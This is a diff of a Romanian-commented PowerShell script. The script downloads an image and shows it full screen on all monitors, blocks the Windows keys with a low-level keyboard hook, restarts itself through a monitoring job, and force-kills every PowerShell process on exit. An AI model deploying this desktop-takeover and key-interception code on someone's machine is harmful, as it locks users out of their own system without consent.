@@ -2,7 +2,7 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
-# Funcție pentru descărcarea imaginii
+# Descărcare imagine
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
@@ -12,33 +12,44 @@ function Download-Image {
     }
 }
 
-# Funcție pentru blocarea tastei Windows
+# Blocarea tastei Windows
 function Block-WindowsKey {
     Add-Type @"
         using System;
         using System.Runtime.InteropServices;
         public class InterceptKeys {
-            [DllImport("user32.dll")]
-            public static extern int GetAsyncKeyState(int vKey);
-            [DllImport("user32.dll")]
-            public static extern int BlockInput(bool block);
+            public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+            public static extern IntPtr GetModuleHandle(string lpModuleName);
+            public const int WH_KEYBOARD_LL = 13;
+            public const int WM_KEYDOWN = 0x0100;
+            public static IntPtr HookID = IntPtr.Zero;
+            public static LowLevelKeyboardProc Proc = HookCallback;
+            public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+                    int vkCode = Marshal.ReadInt32(lParam);
+                    if (vkCode == 0x5B || vkCode == 0x5C) { // Windows Key
+                        return (IntPtr)1; // Blochează tasta
+                    }
+                }
+                return CallNextHookEx(HookID, nCode, wParam, lParam);
+            }
+            public static void SetHook() {
+                HookID = SetWindowsHookEx(WH_KEYBOARD_LL, Proc, GetModuleHandle(null), 0);
+            }
+            public static void RemoveHook() {
+                UnhookWindowsHookEx(HookID);
+            }
         }
 "@
-    Start-Job -ScriptBlock {
-        while ($true) {
-            Start-Sleep -Milliseconds 100
-            if ([InterceptKeys]::GetAsyncKeyState(0x5B) -ne 0) { # Tasta Windows stânga
-                [InterceptKeys]::BlockInput($true)
-                Start-Sleep -Milliseconds 100
-                [InterceptKeys]::BlockInput($false)
-            }
-            if ([InterceptKeys]::GetAsyncKeyState(0x5C) -ne 0) { # Tasta Windows dreapta
-                [InterceptKeys]::BlockInput($true)
-                Start-Sleep -Milliseconds 100
-                [InterceptKeys]::BlockInput($false)
-            }
-        }
-    } | Out-Null
+    [InterceptKeys]::SetHook()
 }
 
 # Afișare imagine pe toate monitoarele
@@ -71,14 +82,6 @@ function Show-FullScreenImage {
         $pictureBox.SizeMode = 'StretchImage'
         $form.Controls.Add($pictureBox)
 
-        # Protejează împotriva închiderii accidentale
-        $form.Add_FormClosing({
-            param($sender, $eventArgs)
-            if (-not $global:exitFlag) {
-                $eventArgs.Cancel = $true
-            }
-        })
-
         $forms += $form
     }
 
@@ -88,6 +91,13 @@ function Show-FullScreenImage {
     }
 
     [System.Windows.Forms.Application]::Run()
+}
+
+# Funcție pentru oprirea completă a aplicației (folosind `cdr`)
+function Stop-All {
+    [InterceptKeys]::RemoveHook()
+    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
+    exit
 }
 
 # Funcție de monitorizare pentru repornire automată
@@ -103,14 +113,7 @@ function Monitor-Image {
     }
 }
 
-# Funcție pentru oprirea completă a aplicației (folosind `cdr`)
-function Stop-All {
-    $global:exitFlag = $true
-    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
-    exit
-}
-
-# Pornire aplicație
+# Pornire aplicație principală și monitorizare
 Download-Image
 Block-WindowsKey
 Start-Job -ScriptBlock { Monitor-Image }
